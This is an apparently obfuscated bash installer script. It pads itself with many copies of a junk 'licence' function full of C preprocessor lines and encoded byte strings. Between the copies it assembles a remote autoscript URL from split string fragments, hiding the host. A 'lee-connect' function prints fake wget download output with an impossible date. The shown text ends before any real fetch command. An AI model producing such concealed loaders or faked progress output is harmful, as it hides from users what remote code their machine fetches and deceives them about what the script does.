#!/bin/bash
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
function lee-connect () {
echo "Connecting to http://leedzung-autoscript.net..."
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86"
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected. "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh] "
echo "Saving to: ‘reno.sh’"
echo ""
echo "reno.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘rno.sh’ saved [9555/9555] "
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘vpn.sh’"
echo ""
echo "vpn.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘vpn.sh’ saved [9555/9555]"
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘taba.sh’"
echo ""
echo "taba.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘taba.sh’ saved [9555/9555]"
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘caca.sh’"
echo ""
echo "caca.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘caca.sh’ saved [9555/9555]"
sleep 0.5
}
chuyen="ht"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
tinh="tp"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
doi=":"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
ta="//"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
nhu="lee"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
thuyen="dzung"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
xa="-"
ben="auto"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
do="script"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
